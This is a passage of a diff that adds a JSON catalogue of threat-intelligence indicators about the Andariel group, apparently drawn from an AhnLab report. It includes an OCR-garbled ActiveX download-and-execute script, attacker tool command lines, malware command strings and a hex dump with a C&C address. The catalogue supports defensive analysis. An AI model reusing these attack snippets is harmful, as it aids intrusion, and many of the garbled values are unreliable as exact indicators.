@@ -1,0 +1,1490 @@
+{
+    "%5BAnalysis%5DAndariel_Group.md": {
+        "Actionable": [
+            {
+                "observable_value": "220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do, South Korea",
+                "artifact_details": "Actionable",
+                "data_source": "CTI report",
+                "classification": "Physical Address",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Full physical address provided in the contact details."
+            },
+            {
+                "observable_value": "+82-31-722-8000",
+                "artifact_details": "Actionable",
+                "data_source": "CTI report",
+                "classification": "Telephone Number",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "International telephone number."
+            },
+            {
+                "observable_value": "+82-31-722-8901",
+                "artifact_details": "Actionable",
+                "data_source": "CTI report",
+                "classification": "Fax Number",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Fax contact number."
+            },
+            {
+                "observable_value": "www.ahnlab.com",
+                "artifact_details": "Actionable",
+                "data_source": "CTI report",
+                "classification": "URL",
+                "STIX_supported": "Full: URL",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Website referenced in the contact information."
+            },
+            {
+                "observable_value": "Exploit code snippet: function getXMLHI tpRequest() | tryingturn new Act (vaXObject( Moxel 2 XMLHTTP. 6.0 ) ) | catcheal (itry(return new Active)(b) == ( \"Msxall INLHTF 5.0\") ) | catch(@2) tryireturn new ActiveXObject   Msxm)2,XMLHTP,4,0\"); | catch(eS) itryireturn new Active XOblect   Msxm12 IMLHITP.3.0 ); | catch(e4)itry(return new ActiveXObject) Mixw12.XMLHIP ) .; | catch(e5){tryIreturn new ActiveXObject( Microsoft. XMLHIIP ); J | catch(ab) fratuen null 193112 | Var sepat XML Hitp Requess () : | var Smage Act IveXOblect(\"ADGE Strega\"); | S. Ispe= = = = = | x. Opent Get . \" /rss sit . 0): | x. Send() = | S. Open();S. Frite(s. responsebody): | Var In = L 000 Indows Peters (8) = 11 Jer | var for- L Mewindows wtempor conhost the i | S. Save ToFile(1n2.2): | S.Claspl ); | var d m new Entel ). | var Hours = d set hours = | var Minutes = d. pethingtes == | var str = [c at. \" + Hours = \" = Hinutes = \" = In : | var D=new ActiveXObject(\"Shell Application\"); | 0, Sell Execute(' c Windows Proysteas22000 Bd.ess\", [/c '(acho M25 type \" + tn2 = ') >' + tn1 = \"\", ' | Q. ShellExecute(\"c\":\"WwindowsPaystems. wir,\"\",\"open\",\"0): | Q.SwillExecute( c.WWwindowsWsystes33Wcwd.axe\", '/c dai: C Ww indowsPiceoffludate, is .",
+                "artifact_details": "Actionable",
+                "data_source": "file content",
+                "classification": "Code Snippet",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Full multi-line exploit code snippet using various ActiveXObject instantiations for XMLHTTP requests and a Shell Application call."
+            },
+            {
+                "observable_value": "c:\\work>nc Usage:main.exe ServerIP, TargetIP, DownloadUrl, RemoteFilePath, [vbScriptPath=c:\\windows\\temp\\winrm.ubs]",
+                "artifact_details": "Actionable",
+                "data_source": "command logs",
+                "classification": "Command/Script",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Command usage example extracted from the attack on central management solution B."
+            },
+            {
+                "observable_value": "c:\\work>nc5rt2 Usage:main.exe LICENSE TargetIP, PORT, DownloadUrl, RemoteFilePath, LubScriptPath=c:\\windows\\temp\\winrm.ubs",
+                "artifact_details": "Actionable",
+                "data_source": "command logs",
+                "classification": "Command/Script",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Command usage example extracted from the attack on central management solution B."
+            },
+            {
+                "observable_value": "c:\\work>bin Usage:main.exe License TargetIP, DownloadUrl, RemoteFilePath, [vbScriptPath=c:\\windows\\temp\\us1.ubs]",
+                "artifact_details": "Actionable",
+                "data_source": "command logs",
+                "classification": "Command/Script",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Command usage example extracted from the attack on central management solution B."
+            },
+            {
+                "observable_value": "```| .0040CE00: 26 02 00 00.00 62 00 00.0E 07 0B 00.03 00 1A 00 80 0 1.8 0 + | 0040CE10: 0E 00 25 00.34 00 70 00.58 46 49 40.45 5F 52 45 4 |  |\n| 0040CE20: 40 4F 54 45.5F 45 58 45.43 50 00 88.46 49 4C 45 HOTE EXECTING LLF | 00400230 . 56.50 41.56.48.30 43.39 50 27.49 46.44 47.27.23 . PATH-C: VIINDONS |  |\n| 0040CE40: 00 00 46 49.40 45 5F 4E 41 45 3D 56 93 50 53 | VOLTILE NAME=V3PS | .0040CE50: 63 61 6E 2E.65 78 65 00.09 46 69 40.45 5F 43 4F can.exe VIFILE CO |\n| 00400E60: 40 40 41 45,44 30 00 08,76 49 66 45,56 % 50 % RHAND-10FILE OPT | 0040CE70: 49 YF 4E 3D 31 00 00 F6.49 4C 45 2F 4F 52 73 5F TON-13BEITE ORG |  |\n| 0040CE80; 50 KT 54 48.3D 43 39 50 27 49 YE 44 TE 2 53 00 PATH-C VAINDOWS | 0040CE90: 00 58 4A 4F.62 49 4E 46.4F 45 58 50.00 08 4A 4F 2LJ0BINFOEK1.8JU |  |\n| 0070CEA0: 42 49 4E 4.45 58 3D 0.00 00 20 22.49 4F 52 49 BINDEX-0VDERLORI | .00400EEBO: 54.59 30 30.00 00 00 00 00 00 00 00 00 00 00 00 00 00 14-07 |  |\n| COLOCECO: BO BO OR DO OR DO AR OR OR DO DO DO DO DO DO CO |  |```",
+                "artifact_details": "Actionable",
+                "data_source": "file system",
+                "classification": "Code Snippet",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Hex dump of the remote execution command used in the attack on central management solution A."
+            },
+            {
+                "observable_value": "F**k Hack Hound.",
+                "artifact_details": "Actionable",
+                "data_source": "binary file content / memory dump",
+                "classification": "Malware Indicator String",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Characteristic string used to identify the Aryan malware."
+            },
+            {
+                "observable_value": "C:\\GhostContoler",
+                "artifact_details": "Actionable",
+                "data_source": "Memory dump/analysis logs",
+                "classification": "File Path",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Extracted from hexadecimal dump strings associated with Gh0st RAT."
+            },
+            {
+                "observable_value": "E:\\DatalMy Projects\\Troy Source Code\\tcp1st\\rifle\\Release\\rifle.pdb",
+                "artifact_details": "Actionable",
+                "data_source": "file system",
+                "classification": "File Path",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "PDB file path string embedded in the executable as an indicator."
+            },
+            {
+                "observable_value": "rfile.exe",
+                "artifact_details": "Actionable",
+                "data_source": "file system logs",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Filename generated with modified hash due to appended garbage data."
+            },
+            {
+                "observable_value": "WanSuc.exe",
+                "artifact_details": "Actionable",
+                "data_source": "file system logs",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Alternate executable observed in the generated file section."
+            },
+            {
+                "observable_value": "$interval",
+                "artifact_details": "Actionable",
+                "data_source": "network logs",
+                "classification": "Malware Command",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command instructing the malware to standby."
+            },
+            {
+                "observable_value": "$downloadexec",
+                "artifact_details": "Actionable",
+                "data_source": "network logs",
+                "classification": "Malware Command",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command for downloading and executing a file."
+            },
+            {
+                "observable_value": "$download",
+                "artifact_details": "Actionable",
+                "data_source": "network logs",
+                "classification": "Malware Command",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Command used by the malware to download a file."
+            },
+            {
+                "observable_value": "C:\\Users\\C8\\Desktop\\rifle\\Release\\rifle.pdb",
+                "artifact_details": "Actionable",
+                "data_source": "file system",
+                "classification": "File Path",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "PDB file path from a variant of Rifdoor as noted in Table 3."
+            },
+            {
+                "observable_value": "E:\\Data\\Mv Projects\\Troy Source Code\\tcp1st\\server\\Release\\server.pdb",
+                "artifact_details": "Actionable",
+                "data_source": "file system",
+                "classification": "File Path",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Additional PDB file path associated with a Rifdoor variant."
+            },
+            {
+                "observable_value": "S^%s\\cmd.exe",
+                "artifact_details": "Actionable",
+                "data_source": "Binary file content / memory analysis",
+                "classification": "String (File path)",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Characterized by the prefix 'S^%' used by Phandoor."
+            },
+            {
+                "observable_value": "S^nehomegpa.dll",
+                "artifact_details": "Actionable",
+                "data_source": "Binary file content / memory analysis",
+                "classification": "File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "DLL file referenced in Phandoor with the distinct prefix 'S^'."
+            },
+            {
+                "observable_value": "Anonymous?",
+                "artifact_details": "Actionable",
+                "data_source": "Binary file content / network analysis",
+                "classification": "String",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Used as a check string during C&C server connection."
+            },
+            {
+                "observable_value": "v1 = Convert 403820(\"S^Anonymous?\");\nstropy s(&Dst, 0x1Bu, v1);\nstrcat s(&Dst, 0x1Bu, dword 4450C0);\n  ( send_403070(0x1Au, 0, 1, 0, &Dst) == -1 || select_4031A0(fd) ==\n1F\n  return 0:\n   = dward 425008;\ndecode 402EF0(dword 4250A0, dword 42509C, dword 4250A8, (int)buf);\nif ( ! ( BYTE)wCommand 4250A4 && v3 == 10 )\n       Convert 403820(\"S^Anonymous?\");",
+                "artifact_details": "Actionable",
+                "data_source": "Malware binary / file content",
+                "classification": "Code snippet",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Extracted code snippet showing the anonymous check and command processing."
+            },
+            {
+                "observable_value": "Advapi32.dll",
+                "artifact_details": "Actionable",
+                "data_source": "Malware Code Analysis",
+                "classification": "DLL File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Standard Windows DLL used for advanced API calls."
+            },
+            {
+                "observable_value": "GetUserNameH",
+                "artifact_details": "Actionable",
+                "data_source": "Malware Code Analysis",
+                "classification": "Windows API Function",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Windows API function to obtain the current user's name."
+            },
+            {
+                "observable_value": "WSACleanup",
+                "artifact_details": "Actionable",
+                "data_source": "Malware Code Analysis",
+                "classification": "Windows API Function",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Function used to clean up Windows Sockets resources."
+            },
+            {
+                "observable_value": "int16)(8 * v11)) & 0x7F8) << 20)",
+                "artifact_details": "Actionable",
+                "data_source": "Malware Code Snippet",
+                "classification": "Code Snippet",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Partial C/C++ code fragment likely used in malware operations, such as encryption or memory manipulation."
+            },
+            {
+                "observable_value": "cmd.exe",
+                "artifact_details": "Actionable",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "The Windows command interpreter mentioned as executed by Andaratm."
+            },
+            {
+                "observable_value": "zcon.exe",
+                "artifact_details": "Actionable",
+                "data_source": "malware analysis reports",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Used by both the Andariel group and Operation Black Mine in their attack methods."
+            }
+        ],
+        "Described": [
+            {
+                "observable_value": "Aryan",
+                "artifact_details": "Described",
+                "data_source": "Malware analysis reports",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Listed as a specific malware family in the report."
+            },
+            {
+                "observable_value": "Gh0st RAT",
+                "artifact_details": "Described",
+                "data_source": "Malware analysis reports",
+                "classification": "Remote Access Trojan",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Known remote access tool used for covert control."
+            },
+            {
+                "observable_value": "Rifdoor",
+                "artifact_details": "Described",
+                "data_source": "Malware analysis reports",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Referenced as a malware variant likely with backdoor functionality."
+            },
+            {
+                "observable_value": "Phandoor",
+                "artifact_details": "Described",
+                "data_source": "Malware analysis reports",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Mentioned in the context of attack tools."
+            },
+            {
+                "observable_value": "Andaratm",
+                "artifact_details": "Described",
+                "data_source": "Malware analysis reports",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Listed as one of the malware families/tools in the report."
+            },
+            {
+                "observable_value": "Operation Black Mine",
+                "artifact_details": "Described",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Attack Campaign",
+                "STIX_supported": "Full: Campaign",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Cyber-attack linked to events in 2014 and 2015 and connected with previous attacks."
+            },
+            {
+                "observable_value": "DarkSeoul",
+                "artifact_details": "Described",
+                "data_source": "Threat Intelligence Reports",
+                "classification": "Attack Campaign",
+                "STIX_supported": "Full: Campaign",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Alias for attacks against South Korean banks and broadcasters in 2013."
+            },
+            {
+                "observable_value": "Andariel group",
+                "artifact_details": "Described",
+                "data_source": "CTI report text",
+                "classification": "Threat Actor",
+                "STIX_supported": "Full: Threat-Actor",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Identified as the adversary group mentioned in the attack vectors."
+            },
+            {
+                "observable_value": "Spear phishing email attachment (2015 method)",
+                "artifact_details": "Described",
+                "data_source": "Email logs",
+                "classification": "Malicious Document",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Attachment used in the 2015 attack; contains visible content and encourages macro activation."
+            },
+            {
+                "observable_value": "Spear phishing email attachment (2017 method)",
+                "artifact_details": "Described",
+                "data_source": "Email logs",
+                "classification": "Malicious Document",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Attachment from 2017 displaying blurred content to increase the likelihood of enabling embedded macros."
+            },
+            {
+                "observable_value": "Active-X vulnerability exploit codes embedded in target website",
+                "artifact_details": "Described",
+                "data_source": "web server logs",
+                "classification": "Exploit Code",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Exploit code injected in the website to trigger malicious behavior via vulnerable Internet Explorer ActiveX."
+            },
+            {
+                "observable_value": "JavaScript/VBScript file that downloads malware",
+                "artifact_details": "Described",
+                "data_source": "file system logs",
+                "classification": "Script File",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "File created on the user system after successful exploitation to download additional malware."
+            },
+            {
+                "observable_value": "Downloaded file hex dump",
+                "artifact_details": "Described",
+                "data_source": "file system forensic analysis",
+                "classification": "Hex Dump",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Hexadecimal representation of the malicious file as recovered from the download process (referenced in Figure 5)."
+            },
+            {
+                "observable_value": "5-byte recovered file hex dump",
+                "artifact_details": "Described",
+                "data_source": "file system forensic analysis",
+                "classification": "Hex Dump",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Hexadecimal representation of a 5-byte segment recovered from the file (referenced in Figure 5)."
+            },
+            {
+                "observable_value": "ActiveXObject('Shell Application')",
+                "artifact_details": "Described",
+                "data_source": "file content analysis",
+                "classification": "COM Object",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "COM object instantiation used to execute shell commands as part of the exploitation process."
+            },
+            {
+                "observable_value": "ActiveXObject instantiations for XMLHTTP (e.g., 'Moxel 2 XMLHTTP.6.0', 'Msxall INLHTF 5.0', etc.)",
+                "artifact_details": "Described",
+                "data_source": "file content analysis",
+                "classification": "COM Object instantiation",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Multiple variations in ActiveXObject creation for XMLHTTP indicate different attempts to exploit the ActiveX vulnerability."
+            },
+            {
+                "observable_value": "v3pscan.exe",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Executable transmitted to the client in the attack on central management solution A."
+            },
+            {
+                "observable_value": "nc.exe",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Malware file used in the attack on central management solution B."
+            },
+            {
+                "observable_value": "nt.exe",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Malware file used in the attack on central management solution B."
+            },
+            {
+                "observable_value": "n5lic.exe",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Malware file used in the attack on central management solution B."
+            },
+            {
+                "observable_value": "nc5rt2.exe",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Malware file used in the attack on central management solution B."
+            },
+            {
+                "observable_value": "Bin.exe",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Executable File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Malware file used in the attack on central management solution B."
+            },
+            {
+                "observable_value": "vs1.vbs",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Script File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "VBScript file generated as part of the attack on central management solution B for downloading malicious files."
+            },
+            {
+                "observable_value": "winrm.vbs",
+                "artifact_details": "Described",
+                "data_source": "file system",
+                "classification": "Script File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "VBScript file generated as part of the attack on central management solution B for downloading malicious files."
+            },
+            {
+                "observable_value": "Excel/Word document containing macros",
+                "artifact_details": "Described",
+                "data_source": "Email logs, system logs",
+                "classification": "Malicious Document",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Document sent as an attachment in the spear\u2010phishing email, where the macro is activated via the \"Use Content\" button."
+            },
+            {
+                "observable_value": "Rifdoor variant",
+                "artifact_details": "Described",
+                "data_source": "Endpoint logs, file analysis",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Malware downloaded after activating the macro in the document."
+            },
+            {
+                "observable_value": "Gh0st RAT",
+                "artifact_details": "Described",
+                "data_source": "Endpoint logs, network forensic data",
+                "classification": "Remote Access Trojan",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Malware used to infect defense industry targets and leak documents."
+            },
+            {
+                "observable_value": "Central management solution B",
+                "artifact_details": "Described",
+                "data_source": "System logs, vulnerability scanning reports",
+                "classification": "Software/Tool",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "A software solution exploited by Gh0st RAT and other malware for central management vulnerabilities."
+            },
+            {
+                "observable_value": "Central management solution A",
+                "artifact_details": "Described",
+                "data_source": "System logs, vulnerability scanning reports",
+                "classification": "Software/Tool",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Exploited via its file distribution function to propagate Gh0st RAT."
+            },
+            {
+                "observable_value": "Stolen digital certificates",
+                "artifact_details": "Described",
+                "data_source": "Certificate stores, system logs",
+                "classification": "Digital Certificate",
+                "STIX_supported": "Full: X509 Certificate",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Digital certificates were stolen and used to sign malware for malicious purposes."
+            },
+            {
+                "observable_value": "DRM program (disguised malware distribution)",
+                "artifact_details": "Described",
+                "data_source": "Network logs, file analysis",
+                "classification": "Software/Tool",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "A legitimate DRM software was mimicked to distribute additional malware."
+            },
+            {
+                "observable_value": "ERP solution update file",
+                "artifact_details": "Described",
+                "data_source": "File logs, system logs",
+                "classification": "File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Update file tampered with to include malware, targeting a specific company."
+            },
+            {
+                "observable_value": "Remote support program installation file containing malware",
+                "artifact_details": "Described",
+                "data_source": "File logs, endpoint logs",
+                "classification": "File",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Proprietary-Documented Technology",
+                "parser": "None",
+                "notes": "Distributed to virtual currency exchange users as part of an attack."
+            },
+            {
+                "observable_value": "Andarat",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "In-house advanced malware used by the Andariel group."
+            },
+            {
+                "observable_value": "Andaratm",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "In-house advanced malware used by the Andariel group."
+            },
+            {
+                "observable_value": "Phandoor",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "In-house advanced malware used by the Andariel group."
+            },
+            {
+                "observable_value": "Rifdoor",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "In-house advanced malware used by the Andariel group."
+            },
+            {
+                "observable_value": "Aryan",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Well-known malware referenced in the CTI report."
+            },
+            {
+                "observable_value": "Gh0st RAT",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Well-known malware referenced in the CTI report."
+            },
+            {
+                "observable_value": "Hex Dump:\n| .0041E000: BB 01 00 00.09 07 00 00.46 75 63 6B.20 48 61 63 70 r. Fr. k Hac |\n| .0041E010: 6B 20 48 6F.75 6E 64 2E.00 00 00 00 00 00 00 00 k Hound. |\n| .0041E020: 00 00 00 00.00 00 00 00.31 37 35 2E.31 31 37 2E 175.117. |\n| .0041E030: 31 34 34 2E.36 37 00 00.6C 6F 67 2E.74 78 74 00 144.67 log.txt |\n| .0041E040: 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF 31 2E 31 2E |\n| .0041E050: 34 00 00 00.4C E0 41 00.6E 65 65 64.20 64 69 63 4 Lafl need dic |",
+                "artifact_details": "Described",
+                "data_source": "binary dump / memory",
+                "classification": "Code Snippet",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Hex dump block extracted from the Aryan malware sample providing both hexadecimal and ASCII representations."
+            },
+            {
+                "observable_value": "Gh0st RAT",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Backdoor malware made in China with publicly available source codes; associated with Andariel group."
+            },
+            {
+                "observable_value": "NCopy of gh0st3.",
+                "artifact_details": "Described",
+                "data_source": "Memory dump/analysis logs",
+                "classification": "File Name",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Partial file name string extracted from hex dump; may relate to Gh0st RAT files."
+            },
+            {
+                "observable_value": "ghost.pdb",
+                "artifact_details": "Described",
+                "data_source": "Memory dump/analysis logs",
+                "classification": "File Name",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Likely a debugging symbol file associated with Gh0st RAT."
+            },
+            {
+                "observable_value": "Chilat RAT Beta 2.5",
+                "artifact_details": "Described",
+                "data_source": "CTI report",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "A Chinese backdoor tool converted into a Korean version and used by the Andariel group."
+            },
+            {
+                "observable_value": "Rifdoor",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Malware name with details regarding activity dates and incidents."
+            },
+            {
+                "observable_value": "Phandoor",
+                "artifact_details": "Described",
+                "data_source": "Threat intelligence reports / malware analysis",
+                "classification": "Malware/Tool",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Proprietary-Undocumented Technology",
+                "parser": "None",
+                "notes": "Malware used from January 2016 to summer 2017."
+            },
+            {
+                "observable_value": "Andaratm malware",
+                "artifact_details": "Described",
+                "data_source": "Threat Intelligence Report",
+                "classification": "Malware",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Name of a malware family with multiple variants; observed in various attacks since 2016."
+            },
+            {
+                "observable_value": "%s\\cmd.exe /c echo | %s > %s",
+                "artifact_details": "Described",
+                "data_source": "Malware Code Analysis",
+                "classification": "Command String",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Command string used by the malware with placeholders for dynamic values."
+            },
+            {
+                "observable_value": "%S*****%S",
+                "artifact_details": "Described",
+                "data_source": "Malware Code Analysis",
+                "classification": "Command String Fragment",
+                "STIX_supported": "No",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Obfuscated string formatting fragment observed in the malware code."
+            },
+            {
+                "observable_value": "TCP Port Scanner U1.1 By WinEggDrop",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: Tool",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Detailed with usage examples of TCP/SYN commands for port scanning."
+            },
+            {
+                "observable_value": "zcon.exe",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Software/Tool",
+                "STIX_supported": "Full: File",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Used with provided command examples; variant also used in Bmdoor in 2015."
+            },
+            {
+                "observable_value": "Crash.exe",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
+                "notes": "Malware reportedly produced by the Andariel group that destroys hard disk contents after August each year."
+            },
+            {
+                "observable_value": "Test.exe",
+                "artifact_details": "Described",
+                "data_source": "system logs",
+                "classification": "Malware",
+                "STIX_supported": "Full: Malware",
+                "proprietary_artifact": "Open/Standard Technology",
+                "parser": "None",
